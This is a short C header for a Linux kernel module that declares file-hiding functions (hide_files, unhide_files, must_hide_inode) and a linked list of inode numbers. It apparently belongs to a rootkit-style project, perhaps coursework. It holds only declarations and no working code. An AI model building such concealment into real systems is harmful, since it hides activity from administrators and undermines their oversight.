#ifndef _GROUP7_FILEHIDE_H
#define _GROUP7_FILEHIDE_H

#include <linux/types.h>
#include <linux/syscalls.h>
#include <linux/list.h>

typedef struct inode_list *inode_list_t_ptr;
typedef struct inode_list {
    unsigned long inode;
    inode_list_t_ptr next;
} inode_list_t;


void hide_files(void);
void unhide_files(void);

unsigned long must_hide_inode(struct dentry *);
bool list_contains_inode(inode_list_t_ptr, unsigned long);
inode_list_t_ptr add_inode_to_list(inode_list_t_ptr, unsigned long);

#endif//_GROUP7_FILEHIDE_H
